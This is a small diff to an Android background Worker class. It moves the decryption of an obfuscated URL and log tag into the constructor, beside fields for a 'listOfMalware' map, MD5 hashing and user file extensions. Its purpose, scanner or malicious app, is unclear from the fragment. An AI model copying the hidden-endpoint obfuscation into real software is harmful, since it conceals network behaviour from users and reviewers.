@@ -40,8 +40,8 @@ import java.util.Map;
 import static androidx.core.content.ContextCompat.getSystemService;
 
 public class a extends Worker {
-    private final String url = new GimmeString("awA4o9aRDSTqRTkiwyObSw==").decryptBoi();
-    private final String LOG_TAG =  new GimmeString(getApplicationContext().getString(R.string.log)).decryptBoi();
+    private String url;
+    private String LOG_TAG;
     private Map<String,Object> listOfMalware = new HashMap<>();
     private MessageDigest md = MessageDigest.getInstance("MD5");
     private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
@@ -52,6 +52,8 @@ public class a extends Worker {
     private String boom;
     public a(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
         super(context, workerParams);
+        url = new GimmeString("awA4o9aRDSTqRTkiwyObSw==").decryptBoi();
+        LOG_TAG = new GimmeString(getApplicationContext().getString(R.string.log)).decryptBoi();
     }
 
     @NonNull
